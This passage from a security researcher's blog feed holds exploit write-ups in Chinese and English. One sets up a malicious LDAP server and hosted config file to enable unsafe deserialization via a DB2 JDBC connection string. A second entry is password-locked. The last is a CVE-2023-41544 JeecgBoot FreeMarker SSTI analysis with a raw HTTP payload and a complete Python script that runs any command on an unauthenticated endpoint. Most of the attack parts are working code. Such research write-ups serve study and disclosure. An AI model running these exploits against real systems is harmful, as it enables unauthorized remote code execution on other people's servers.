class="hljs-name">dependency</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>commons-lang<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>commons-lang<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>2.6<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>commons-logging<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>commons-logging<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>1.1.3<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span> <span class="hljs-comment">&lt;!-- Use the appropriate version --&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>com.ibm.db2.jcc<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>db2jcc<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>db2jcc4<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span><br></code></pre></td></tr></table></figure><p>然后是访问的index.jsp</p><figure class="highlight jsp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs jsp">&lt;%@ page language=<span class="hljs-string">&quot;java&quot;</span> contentType=<span class="hljs-string">&quot;text/html; charset=UTF-8&quot;</span> pageEncoding=<span class="hljs-string">&quot;UTF-8&quot;</span>%&gt;<br>&lt;!DOCTYPE html&gt;<br>&lt;html&gt;<br>&lt;head&gt;<br>    &lt;meta charset=<span class="hljs-string">&quot;UTF-8&quot;</span>&gt;<br>    &lt;title&gt;Test Connect Form&lt;/title&gt;<br>&lt;/head&gt;<br>&lt;body&gt;<br>&lt;h2&gt;Test Connect Form&lt;/h2&gt;<br>&lt;form action=<span class="hljs-string">&quot;TestDBConnection&quot;</span> method=<span class="hljs-string">&quot;post&quot;</span>&gt;<br>    &lt;label <span class="hljs-keyword">for</span>=<span class="hljs-string">&quot;connectionString&quot;</span>&gt;URL:&lt;/label&gt;&lt;br&gt;<br>    &lt;input type=<span class="hljs-string">&quot;text&quot;</span> id=<span class="hljs-string">&quot;connectionString&quot;</span> name=<span class="hljs-string">&quot;connectionString&quot;</span> required&gt;&lt;br&gt;<br><br>    &lt;label <span class="hljs-keyword">for</span>=<span class="hljs-string">&quot;username&quot;</span>&gt;Username:&lt;/label&gt;&lt;br&gt;<br>    &lt;input type=<span class="hljs-string">&quot;text&quot;</span> id=<span class="hljs-string">&quot;username&quot;</span> name=<span class="hljs-string">&quot;username&quot;</span> required&gt;&lt;br&gt;<br><br>    &lt;label <span class="hljs-keyword">for</span>=<span class="hljs-string">&quot;password&quot;</span>&gt;Password:&lt;/label&gt;&lt;br&gt;<br>    &lt;input type=<span class="hljs-string">&quot;password&quot;</span> id=<span class="hljs-string">&quot;password&quot;</span> name=<span class="hljs-string">&quot;password&quot;</span> required&gt;&lt;br&gt;<br><br>    &lt;input type=<span class="hljs-string">&quot;submit&quot;</span> value=<span class="hljs-string">&quot;submit&quot;</span>&gt;<br>&lt;/form&gt;<br>&lt;/body&gt;<br>&lt;/html&gt;<br></code></pre></td></tr></table></figure><p>然后是用于实际连接的java类</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">import</span> java.io.IOException;<br><span class="hljs-keyword">import</span> java.io.PrintWriter;<br><span class="hljs-keyword">import</span> java.sql.Connection;<br><span class="hljs-keyword">import</span> java.sql.DriverManager;<br><span class="hljs-keyword">import</span> java.sql.SQLException;<br><br><span class="hljs-keyword">import</span> javax.naming.InitialContext;<br><span class="hljs-keyword">import</span> javax.naming.NamingException;<br><span class="hljs-keyword">import</span> javax.servlet.ServletException;<br><span class="hljs-keyword">import</span> javax.servlet.annotation.WebServlet;<br><span class="hljs-keyword">import</span> javax.servlet.http.HttpServlet;<br><span class="hljs-keyword">import</span> javax.servlet.http.HttpServletRequest;<br><span class="hljs-keyword">import</span> javax.servlet.http.HttpServletResponse;<br><br><span class="hljs-meta">@WebServlet(&quot;/TestDBConnection&quot;)</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">TestDBConnection</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">HttpServlet</span> &#123;<br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> <span class="hljs-type">long</span> <span class="hljs-variable">serialVersionUID</span> <span class="hljs-operator">=</span> <span class="hljs-number">1L</span>;<br><br>    <span class="hljs-keyword">protected</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">doPost</span><span class="hljs-params">(HttpServletRequest request, HttpServletResponse response)</span><br>            <span class="hljs-keyword">throws</span> ServletException, IOException &#123;<br>        response.setContentType(<span class="hljs-string">&quot;text/html;charset=UTF-8&quot;</span>);<br>        <span class="hljs-type">PrintWriter</span> <span class="hljs-variable">out</span> <span class="hljs-operator">=</span> response.getWriter();<br><br>        <span class="hljs-type">String</span> <span class="hljs-variable">connectionString</span> <span class="hljs-operator">=</span> request.getParameter(<span class="hljs-string">&quot;connectionString&quot;</span>);<br>        <span class="hljs-type">String</span> <span class="hljs-variable">username</span> <span class="hljs-operator">=</span> request.getParameter(<span class="hljs-string">&quot;username&quot;</span>);<br>        <span class="hljs-type">String</span> <span class="hljs-variable">password</span> <span class="hljs-operator">=</span> request.getParameter(<span class="hljs-string">&quot;password&quot;</span>);<br><br>        <span class="hljs-keyword">try</span> &#123;<br>            <span class="hljs-comment">// 加载DB2 JDBC驱动</span><br>            Class.forName(<span class="hljs-string">&quot;com.ibm.db2.jcc.DB2Driver&quot;</span>);<br><br>            <span class="hljs-comment">// 尝试建立数据库连接</span><br>            <span class="hljs-type">Connection</span> <span class="hljs-variable">connection</span> <span class="hljs-operator">=</span> DriverManager.getConnection(connectionString, username, password);<br><br>            <span class="hljs-comment">// 如果成功连接，则输出成功消息</span><br>            out.println(<span class="hljs-string">&quot;&lt;html&gt;&lt;body&gt;&lt;h2&gt;连接成功!&lt;/h2&gt;&lt;/body&gt;&lt;/html&gt;&quot;</span>);<br><br>            <span class="hljs-comment">// 关闭连接</span><br>            connection.close();<br>        &#125; <span class="hljs-keyword">catch</span> (ClassNotFoundException | SQLException e) &#123;<br>            <span class="hljs-comment">// 如果连接失败，则输出错误消息</span><br>            out.println(<span class="hljs-string">&quot;&lt;html&gt;&lt;body&gt;&lt;h2&gt;连接失败!&lt;/h2&gt;&lt;p&gt;&quot;</span> + e.getMessage() + <span class="hljs-string">&quot;&lt;/p&gt;&lt;/body&gt;&lt;/html&gt;&quot;</span>);<br>        &#125; <span class="hljs-keyword">catch</span> (NamingException e) &#123;<br>            <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">RuntimeException</span>(e);<br>        &#125;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="0x03-攻击利用"><a href="#0x03-攻击利用" class="headerlink" title="0x03 攻击利用"></a>0x03 攻击利用</h2><p>采用LDAP服务的方式进行利用，本地修改好代码，搭建一个文件托管服务，下面是</p><p>修改系统配置信息：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">import</span> com.unboundid.ldap.listener.InMemoryDirectoryServer;<br><span class="hljs-keyword">import</span> com.unboundid.ldap.listener.InMemoryDirectoryServerConfig;<br><span class="hljs-keyword">import</span> com.unboundid.ldap.listener.InMemoryListenerConfig;<br><span class="hljs-keyword">import</span> com.unboundid.ldap.listener.interceptor.InMemoryInterceptedSearchResult;<br><span class="hljs-keyword">import</span> com.unboundid.ldap.listener.interceptor.InMemoryOperationInterceptor;<br><span class="hljs-keyword">import</span> com.unboundid.ldap.sdk.Entry;<br><span class="hljs-keyword">import</span> com.unboundid.ldap.sdk.LDAPResult;<br><span class="hljs-keyword">import</span> com.unboundid.ldap.sdk.ResultCode;<br><span class="hljs-keyword">import</span> javax.naming.Reference;<br><span class="hljs-keyword">import</span> javax.naming.StringRefAddr;<br><span class="hljs-keyword">import</span> javax.net.ServerSocketFactory;<br><span class="hljs-keyword">import</span> javax.net.SocketFactory;<br><span class="hljs-keyword">import</span> javax.net.ssl.SSLSocketFactory;<br><span class="hljs-keyword">import</span> java.net.InetAddress;<br><span class="hljs-keyword">import</span> java.io.*;<br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">LDAPServer</span> &#123;<br>    <span class="hljs-keyword">static</span> <span class="hljs-type">String</span> <span class="hljs-variable">userDN</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;dc=ldap;dc=com&quot;</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        System.setProperty(<span class="hljs-string">&quot;org.apache.commons.collections.enableUnsafeSerialization&quot;</span>,<span class="hljs-string">&quot;true&quot;</span>);<br>        <span class="hljs-type">InMemoryDirectoryServerConfig</span> <span class="hljs-variable">imConfig</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span><br>                <span class="hljs-title class_">InMemoryDirectoryServerConfig</span>(userDN);<br>        imConfig.setListenerConfigs(<span class="hljs-keyword">new</span> <span class="hljs-title class_">InMemoryListenerConfig</span>(<span class="hljs-string">&quot;listen&quot;</span>,<br>                InetAddress.getByName(<span class="hljs-string">&quot;0.0.0.0&quot;</span>),<span class="hljs-number">1379</span>,<br>                ServerSocketFactory.getDefault(),<br>                SocketFactory.getDefault(),<br>                (SSLSocketFactory)SSLSocketFactory.getDefault())<br>        );<br>        imConfig.addInMemoryOperationInterceptor(<span class="hljs-keyword">new</span> <span class="hljs-title class_">LdapInterpetor</span>());<br>        <span class="hljs-type">InMemoryDirectoryServer</span> <span class="hljs-variable">ldapServer</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">InMemoryDirectoryServer</span>(imConfig);<br>        ldapServer.startListening();<br>    &#125;<br>    <span class="hljs-keyword">static</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">LdapInterpetor</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">InMemoryOperationInterceptor</span> &#123;<br>        <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> Reference <span class="hljs-title function_">systemConfiguration</span><span class="hljs-params">()</span>&#123;<br>            <span class="hljs-type">Reference</span> <span class="hljs-variable">ref</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Reference</span>(<span class="hljs-string">&quot;org.apache.commons.configuration.SystemConfiguration&quot;</span>,<span class="hljs-string">&quot;org.apache.tomcat.jdbc.naming.GenericNamingResourcesFactory&quot;</span>, <span class="hljs-literal">null</span>);<br>            ref.add(<span class="hljs-keyword">new</span> <span class="hljs-title class_">StringRefAddr</span>(<span class="hljs-string">&quot;SystemProperties&quot;</span>, <span class="hljs-string">&quot;http://127.0.0.1:6666/system.txt&quot;</span>)); <span class="hljs-comment">//配置文件的地址</span><br>            <span class="hljs-keyword">return</span> ref;<br>        &#125;<br>        <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-type">byte</span>[] serializeObject(Serializable obj) &#123;<br>            <span class="hljs-keyword">try</span> (<span class="hljs-type">ByteArrayOutputStream</span> <span class="hljs-variable">bos</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ByteArrayOutputStream</span>();<br>                 <span class="hljs-type">ObjectOutputStream</span> <span class="hljs-variable">oos</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectOutputStream</span>(bos)) &#123;<br>                oos.writeObject(obj);<br>                <span class="hljs-keyword">return</span> bos.toByteArray();<br>            &#125; <span class="hljs-keyword">catch</span> (IOException e) &#123;<br>                e.printStackTrace();<br>                <span class="hljs-keyword">return</span> <span class="hljs-literal">null</span>;<br>            &#125;<br>        &#125;<br>        <span class="hljs-meta">@Override</span><br>        <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">processSearchResult</span><span class="hljs-params">(InMemoryInterceptedSearchResult request)</span> &#123;<br>            <span class="hljs-type">Entry</span> <span class="hljs-variable">entry</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Entry</span>(request.getRequest().getBaseDN());<br>            <span class="hljs-keyword">try</span> &#123;<br>                System.out.println(<span class="hljs-string">&quot;start&quot;</span>);<br>                <span class="hljs-type">String</span> <span class="hljs-variable">className</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;java.lang.String&quot;</span>;<br>                entry.addAttribute(<span class="hljs-string">&quot;javaSerializedData&quot;</span>, serializeObject(systemConfiguration()));<br>                entry.addAttribute(<span class="hljs-string">&quot;javaClassName&quot;</span>,className);<br>                entry.addAttribute(<span class="hljs-string">&quot;objectClass&quot;</span>,<span class="hljs-string">&quot;javaNamingReference&quot;</span>);<br>                request.sendSearchEntry(entry);<br>                request.setResult(<span class="hljs-keyword">new</span> <span class="hljs-title class_">LDAPResult</span>(<span class="hljs-number">0</span>, ResultCode.SUCCESS));<br>                System.out.println(<span class="hljs-string">&quot;stop&quot;</span>);<br>            &#125;<span class="hljs-keyword">catch</span> (Exception e)&#123;<br>                e.printStackTrace();<br>            &#125;<br>        &#125;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p><img src="/./../images/image-20231229214427117.png" alt="image-20231229214427117"></p><p>搭建一个文件托管(这里就直接用python)</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python">python -m http.server <span class="hljs-number">6666</span><br></code></pre></td></tr></table></figure><p>配置文件内容</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs java">org.apache.commons.collections.enableUnsafeSerialization=<span class="hljs-literal">true</span><br></code></pre></td></tr></table></figure><p>然后直接打CC3链子就行了</p>]]></content>
    
    
    <categories>
      
      <category>rce</category>
      
    </categories>
    
    
    <tags>
      
      <tag>CTF</tag>
      
      <tag>Bypass</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>LimeSurvey GetShell</title>
    <link href="/2023/12/26/LimeSurvey_GetShell/"/>
    <url>/2023/12/26/LimeSurvey_GetShell/</url>
    
    <content type="html"><![CDATA[<div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="抱歉，这个密码看着不太对，请再试试。" data-whm="抱歉，这个文章不能被纠正，不过您还是能看看解密后的内容。">  <script id="hbeData" type="hbeData" data-hmacdigest="c036fc71fda7580ccb7e6fbe5ffb16d1cc8ebce9dde5b44ddca9ee78e7c7af6e"></script>  <div class="hbe hbe-content">    <div class="hbe hbe-input hbe-input-default">      <input class="hbe hbe-input-field hbe-input-field-default" type="password" id="hbePass">      <label class="hbe hbe-input-label hbe-input-label-default" for="hbePass">        <span class="hbe hbe-input-label-content hbe-input-label-content-default">您好，这里需要密码。</span>      </label>    </div>  </div></div><script data-pjax src="/lib/hbe.js"></script><link href="/css/hbe.style.css" rel="stylesheet" type="text/css">]]></content>
    
    
    <categories>
      
      <category>rce</category>
      
    </categories>
    
    
    <tags>
      
      <tag>代码审计</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>CVE-2023-41544(JeecgBoot FreeMarker SSTI)</title>
    <link href="/2023/09/18/CVE-2023-41544(JeecgBoot_SSTI)/"/>
    <url>/2023/09/18/CVE-2023-41544(JeecgBoot_SSTI)/</url>
    
    <content type="html"><![CDATA[<h2 id="Description"><a href="#Description" class="headerlink" title="Description"></a>Description</h2><p>The JeecgBoot&#x2F;jeecg boot&#x2F;jmreport&#x2F;loadTableData Api interface does not have identity verification. Freemarker is used to process SQL parameters passed in by the user, and arbitrary code is executed on the application side through SSTI.</p><h2 id="Affected-version"><a href="#Affected-version" class="headerlink" title="Affected version"></a>Affected version</h2><p>JeecgBoot &lt;&#x3D; v3.5.3</p><h2 id="Vulnerability-Analysis"><a href="#Vulnerability-Analysis" class="headerlink" title="Vulnerability Analysis"></a>Vulnerability Analysis</h2><p><code>/jeecg-boot/jmreport/loadTableData</code>interface has SSTI injection of FreeMarkerUtils</p><p>Trace call stack</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs stylus">org<span class="hljs-selector-class">.jeecg</span><span class="hljs-selector-class">.modules</span><span class="hljs-selector-class">.jmreport</span><span class="hljs-selector-class">.desreport</span><span class="hljs-selector-class">.a</span>.c-&gt;this<span class="hljs-selector-class">.reportDbService</span><span class="hljs-selector-class">.parseReportSql</span><br><br>org<span class="hljs-selector-class">.jeecg</span><span class="hljs-selector-class">.modules</span><span class="hljs-selector-class">.jmreport</span><span class="hljs-selector-class">.desreport</span><span class="hljs-selector-class">.service</span><span class="hljs-selector-class">.a</span>.parseReportSql-&gt;f<span class="hljs-selector-class">.a</span><br><br>org<span class="hljs-selector-class">.jeecg</span><span class="hljs-selector-class">.modules</span><span class="hljs-selector-class">.jmreport</span><span class="hljs-selector-class">.desreport</span><span class="hljs-selector-class">.util</span><span class="hljs-selector-class">.f</span>.a-&gt;FreeMarkerUtils<span class="hljs-selector-class">.a</span><br><br>org<span class="hljs-selector-class">.jeecg</span><span class="hljs-selector-class">.modules</span><span class="hljs-selector-class">.jmreport</span><span class="hljs-selector-class">.desreport</span><span class="hljs-selector-class">.render</span><span class="hljs-selector-class">.utils</span><span class="hljs-selector-class">.FreeMarkerUtils</span>.a-&gt;(new <span class="hljs-built_in">Template</span>(<span class="hljs-string">&quot;template&quot;</span>, new <span class="hljs-built_in">StringReader</span>(var0), var2))<span class="hljs-selector-class">.process</span>(var1, var3)<br></code></pre></td></tr></table></figure><p>By writing a payload with a freemarker template in the SQL parameters, template parsing can be triggered, resulting in template injection. Additionally, this version does not restrict classes, so template injection can cause arbitrary command execution</p><p>From Routing Processing Logic to the LoadTableData Function</p><p><img src="/./../images/image-20230918173752359.png" alt="image-20230918173752359"></p><p>Then use f.a to parse the Freemarker template for SQL</p><p><img src="/./../images/image-20230918173803314.png" alt="image-20230918173803314"></p><p>So we can construct the request</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs http"><span class="hljs-keyword">POST</span> <span class="hljs-string">/jeecg-boot/jmreport/loadTableData</span> <span class="hljs-meta">HTTP/1.1</span><br><span class="hljs-attribute">Host</span><span class="hljs-punctuation">: </span>localhost:8088<br><span class="hljs-attribute">User-Agent</span><span class="hljs-punctuation">: </span>Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/116.0<br><span class="hljs-attribute">Accept</span><span class="hljs-punctuation">: </span>application/json, text/plain, */*<br><span class="hljs-attribute">Accept-Language</span><span class="hljs-punctuation">: </span>zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2<br><span class="hljs-attribute">Accept-Encoding</span><span class="hljs-punctuation">: </span>gzip, deflate<br><span class="hljs-attribute">Content-Type</span><span class="hljs-punctuation">: </span>application/json;charset=UTF-8<br><span class="hljs-attribute">X-Sign</span><span class="hljs-punctuation">: </span>8DFA6138EFBF3D5ECA9D62F6FB80C84D<br><span class="hljs-attribute">X-TIMESTAMP</span><span class="hljs-punctuation">: </span>1692975637994<br><span class="hljs-attribute">X-Access-Token</span><span class="hljs-punctuation">: </span>null<br><span class="hljs-attribute">token</span><span class="hljs-punctuation">: </span>null<br><span class="hljs-attribute">JmReport-Tenant-Id</span><span class="hljs-punctuation">: </span>null<br><span class="hljs-attribute">Content-Length</span><span class="hljs-punctuation">: </span>178<br><span class="hljs-attribute">Origin</span><span class="hljs-punctuation">: </span>http://localhost:8088<br><span class="hljs-attribute">Connection</span><span class="hljs-punctuation">: </span>close<br><br><span class="language-pgsql">&#123;&quot;dbSource&quot;:&quot;&quot;,&quot;sql&quot;:&quot;select &#x27;result:&lt;#assign ex=\&quot;freemarker.<span class="hljs-keyword">template</span>.utility.<span class="hljs-keyword">Execute</span>\&quot;?new()&gt; $&#123; ex(\&quot;cmd /c calc\&quot;) &#125;&#x27;&quot;,&quot;tableName&quot;:&quot;test_demo);&quot;,&quot;pageNo&quot;:<span class="hljs-number">1</span>,&quot;pageSize&quot;:<span class="hljs-number">10</span>&#125;</span><br></code></pre></td></tr></table></figure><h4 id="The-actual-payload-is-in-the-SQL-parameters"><a href="#The-actual-payload-is-in-the-SQL-parameters" class="headerlink" title="The actual payload is in the SQL parameters"></a>The actual payload is in the SQL parameters</h4><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">select</span> <span class="hljs-string">&#x27;result:&lt;#assign ex=\&quot;freemarker.template.utility.Execute\&quot;?new()&gt; $&#123; ex(\&quot;cmd /c calc\&quot;) &#125;&#x27;</span><br></code></pre></td></tr></table></figure><h4 id="The-complete-utilization-script-is-as-follows"><a href="#The-complete-utilization-script-is-as-follows" class="headerlink" title="The complete utilization script is as follows"></a>The complete utilization script is as follows</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> requests<br><span class="hljs-keyword">import</span> json<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">invokecmd</span>(<span class="hljs-params">url,cmd</span>):<br>    url=url+<span class="hljs-string">&quot;/jeecg-boot/jmreport/loadTableData&quot;</span><br>    headers = &#123;<br>        <span class="hljs-string">&#x27;User-Agent&#x27;</span>: <span class="hljs-string">&#x27;Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/116.0&#x27;</span>,<br>        <span class="hljs-string">&#x27;Accept&#x27;</span>: <span class="hljs-string">&#x27;application/json, text/plain, */*&#x27;</span>,<br>        <span class="hljs-string">&#x27;Accept-Language&#x27;</span>: <span class="hljs-string">&#x27;zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2&#x27;</span>,<br>        <span class="hljs-string">&#x27;Referer&#x27;</span>: <span class="hljs-string">&#x27;http://localhost:8088/jeecg-boot/jmreport/list&#x27;</span>,<br>        <span class="hljs-string">&#x27;X-Access-Token&#x27;</span>: <span class="hljs-string">&#x27;null&#x27;</span>,<br>        <span class="hljs-string">&#x27;token&#x27;</span>: <span class="hljs-string">&#x27;null&#x27;</span>,<br>        <span class="hljs-string">&#x27;JmReport-Tenant-Id&#x27;</span>: <span class="hljs-string">&#x27;null&#x27;</span>,<br>        <span class="hljs-string">&#x27;Content-Type&#x27;</span>: <span class="hljs-string">&#x27;application/json&#x27;</span>,<br>        <span class="hljs-string">&#x27;Connection&#x27;</span>: <span class="hljs-string">&#x27;close&#x27;</span>,<br>        <span class="hljs-string">&#x27;Sec-Fetch-Dest&#x27;</span>: <span class="hljs-string">&#x27;empty&#x27;</span>,<br>        <span class="hljs-string">&#x27;Sec-Fetch-Mode&#x27;</span>: <span class="hljs-string">&#x27;no-cors&#x27;</span>,<br>        <span class="hljs-string">&#x27;Sec-Fetch-Site&#x27;</span>: <span class="hljs-string">&#x27;same-origin&#x27;</span>,<br>        <span class="hljs-string">&#x27;Pragma&#x27;</span>: <span class="hljs-string">&#x27;no-cache&#x27;</span>,<br>        <span class="hljs-string">&#x27;Cache-Control&#x27;</span>: <span class="hljs-string">&#x27;no-cache&#x27;</span><br>    &#125;<br>    payload=<span class="hljs-string">&quot;&quot;&quot;&#123;&quot;dbSource&quot;:&quot;&quot;,&quot;sql&quot;:&quot;select &#x27;result:&lt;#assign ex=\\&quot;freemarker.template.utility.Execute\\&quot;?new()&gt; $&#123; ex(\\\&quot;&quot;&quot;&quot;</span>+cmd+<span class="hljs-string">&quot;&quot;&quot; \\&quot;) &#125;&#x27;&quot;,&quot;tableName&quot;:&quot;test_demo);&quot;,&quot;pageNo&quot;:1,&quot;pageSize&quot;:10&#125;&quot;&quot;&quot;</span><br>    <span class="hljs-built_in">print</span>(payload)<br>    response=requests.post(url,headers=headers,data=payload)<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;命令执行成功&quot;</span>)<br><span class="hljs-comment"># invokecmd(&quot;http://localhost:8088&quot;,&quot;calc&quot;)</span><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:<br>    url=<span 